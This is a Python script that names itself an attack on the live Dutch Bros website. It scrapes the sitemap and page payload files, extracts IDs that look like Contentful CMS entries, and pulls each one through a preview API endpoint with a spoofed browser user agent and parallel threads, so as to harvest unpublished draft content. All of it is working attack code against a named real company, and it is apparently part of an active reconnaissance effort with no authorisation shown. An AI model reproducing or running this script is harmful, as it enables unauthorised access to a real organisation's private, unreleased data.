#!/usr/bin/env python3
"""Draft-diff attack: harvest entry IDs from all route payloads, preview-fetch each,
diff preview (draft) vs payload (published snapshot)."""
import json, re, os, time, concurrent.futures, urllib.request, urllib.error, hashlib

BASE = "https://www.dutchbros.com"
BUILD = "bac26790-0c6c-43bd-9738-c409b7841561"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"}
OUT = "/home/z/my-project/recon/draftdiff"
os.makedirs(OUT, exist_ok=True)

ID_RE = re.compile(r'^[A-Za-z0-9_-]{20,23}$')

def looks_like_cf_id(s):
    if not ID_RE.match(s): return False
    return (any(c.isdigit() for c in s) and any(c.isupper() for c in s)
            and any(c.islower() for c in s))

def fetch(url, timeout=25):
    try:
        req = urllib.request.Request(url, headers=UA)
        return urllib.request.urlopen(req, timeout=timeout).read()
    except Exception as e:
        return b''

# --- step 1: URLs from sitemap
sitemap = open('/home/z/my-project/recon/sitemap.xml').read()
urls = sorted(set(re.findall(r'<loc>(https://www\.dutchbros\.com[^<]*)</loc>', sitemap)))
print(f"[1] {len(urls)} sitemap URLs")

# --- step 2: fetch payloads (checkpointed)
payload_dir = os.path.join(OUT, 'payloads')
os.makedirs(payload_dir, exist_ok=True)
def get_payload(u):
    name = u.rstrip('/').replace('https://www.dutchbros.com/', '').replace('/', '_') or 'home'
    fp = os.path.join(payload_dir, name + '.json')
    if os.path.exists(fp) and os.path.getsize(fp) > 50:
        return name, open(fp, 'rb').read()
    body = fetch(f"{u.rstrip('/')}/_payload.json?_b={BUILD}")
    if body and len(body) > 50:
        open(fp, 'wb').write(body)
        return name, body
    return name, b''

t0 = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
    results = list(ex.map(get_payload, urls))
got = [n for n, b in results if b]
print(f"[2] payloads fetched: {len(got)}/{len(urls)} ({time.time()-t0:.0f}s)")

# --- step 3: extract candidate entry IDs
ids = set()
for n, body in results:
    if not body: continue
    for m in re.finditer(rb'"([A-Za-z0-9_-]{20,23})"', body):
        s = m.group(1).decode()
        if looks_like_cf_id(s): ids.add(s)
print(f"[3] candidate entry IDs: {len(ids)}")

# --- step 4: preview-fetch each (checkpointed)
prev_dir = os.path.join(OUT, 'preview')
os.makedirs(prev_dir, exist_ok=True)
todo = [i for i in sorted(ids) if not os.path.exists(os.path.join(prev_dir, i + '.json'))]
print(f"[4] preview fetches needed: {len(todo)}")
def get_preview(eid):
    fp = os.path.join(prev_dir, eid + '.json')
    if os.path.exists(fp): return eid
    body = fetch(f"{BASE}/api/contentful/preview?entryId={eid}")
    if body:
        open(fp, 'wb').write(body)
    time.sleep(0.15)
    return eid

t0 = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
    list(ex.map(get_preview, todo))
print(f"    done ({time.time()-t0:.0f}s)")

# --- step 5: classify
found, notfound, error = [], [], []
for i in sorted(ids):
    fp = os.path.join(prev_dir, i + '.json')
    if not os.path.exists(fp): continue
    b = open(fp, 'rb').read()
    if b.startswith(b'{') and b'"type":"Entry"' in b: found.append(i)
    elif b'Entry not found' in b: notfound.append(i)
    else: error.append(i)
print(f"[5] preview: {len(found)} entries, {len(notfound)} not found, {len(error)} errors")

json.dump({'found': found, 'notfound': notfound, 'error': error},
          open(os.path.join(OUT, 'summary.json'), 'w'), indent=1)
print("saved", os.path.join(OUT, 'summary.json'))
